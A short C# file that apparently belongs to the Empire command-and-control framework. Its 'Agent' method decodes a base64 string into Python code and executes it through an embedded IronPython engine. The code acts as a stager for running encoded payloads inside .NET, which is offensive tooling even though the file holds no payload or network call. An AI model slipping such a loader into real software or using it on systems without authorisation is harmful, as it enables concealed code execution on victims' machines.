using System;
using System.IO.Compression;
using System.IO;
using System.Text;
using IronPython.Hosting;
using IronPython.Modules;
using IronPython.Runtime;
using Microsoft.Scripting;
using Microsoft.Scripting.Hosting;
using System.Collections;
using System.Reflection;

namespace CSharpPy
{
    class Empire
    {
        public static void Agent(string B64PyCode, string PyDirectory)
        {
            string PyCode = "";
            byte[] ScriptBytes = Convert.FromBase64String(B64PyCode);
            PyCode = Encoding.ASCII.GetString(ScriptBytes);
            ScriptEngine engine = Python.CreateEngine();

            var searchPaths = engine.GetSearchPaths();
            searchPaths.Add(PyDirectory);
            engine.SetSearchPaths(searchPaths);

            var script = engine.CreateScriptSourceFromString(PyCode, SourceCodeKind.Statements);
            script.Execute();
        }
    }
}